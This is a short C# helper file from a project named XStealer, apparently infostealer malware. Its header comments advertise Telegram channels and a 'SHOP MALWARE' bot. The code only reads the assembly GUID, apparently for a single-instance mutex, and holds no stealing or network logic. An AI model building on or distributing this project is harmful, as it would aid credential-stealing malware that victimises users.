// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Helpers
{
    using System.Reflection;
    using System.Runtime.InteropServices;

    public static class MutEx
    {
        /// <summary>
        /// Метод для получения GUID текущего приложения
        /// </summary>
        public static string ID
        {
            get
            {
                string result = string.Empty;
                try
                {
                    Assembly assembly = typeof(XStealer).Assembly;
                    var attribute = (GuidAttribute)assembly.GetCustomAttributes(typeof(GuidAttribute), true)[0];
                    result = attribute?.Value?.ToUpper();
                }
                catch { }
                return result;
            }
        }
    }
}